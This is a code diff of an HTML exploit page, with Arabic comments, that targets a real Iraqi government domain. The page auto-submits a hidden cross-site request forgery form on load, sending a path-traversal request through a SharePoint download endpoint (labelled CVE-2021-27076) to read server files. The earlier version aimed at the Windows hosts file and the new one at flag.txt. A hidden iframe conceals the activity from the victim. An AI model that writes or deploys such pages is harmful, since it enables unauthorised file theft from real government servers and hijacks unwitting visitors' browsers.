@@ -2,17 +2,26 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>CSRF + File Read Exploit</title>
+  <title>Zero-Click CSRF + CVE-2021-27076 Exploit</title>
 </head>
-<body onload="document.forms[0].submit()">
+<body>
 
-  <h2>Attempting File Read via CVE-2021-27076 + CSRF</h2>
-  <p>This page sends an automatic request to mof.gov.iq to try reading a file using a crafted path traversal.</p>
+  <h2 style="text-align:center;">Silent CSRF Exploit Running...</h2>
 
-  <!-- عدّل هنا فقط اسم الملف أو المسار -->
-  <form method="GET" action="https://mof.gov.iq/_layouts/15/download.aspx">
-    <input type="hidden" name="SourceUrl" value="/sites/test/../../../../../../Windows/System32/drivers/etc/hosts">
+  <!-- نموذج يتم إرساله تلقائيًا -->
+  <form id="exploit" method="GET" action="https://mof.gov.iq/_layouts/15/download.aspx" target="invisibleFrame">
+    <input type="hidden" name="SourceUrl" value="/sites/test/../../../../../../flag.txt">
   </form>
+
+  <!-- يتم تنفيذ الهجوم تلقائيًا عند تحميل الصفحة -->
+  <script>
+    window.onload = function() {
+      document.getElementById('exploit').submit();
+    };
+  </script>
+
+  <!-- إطار مخفي لتجنب إظهار أي رد فعل بصري للضحية -->
+  <iframe name="invisibleFrame" style="display:none;"></iframe>
 
 </body>
 </html>
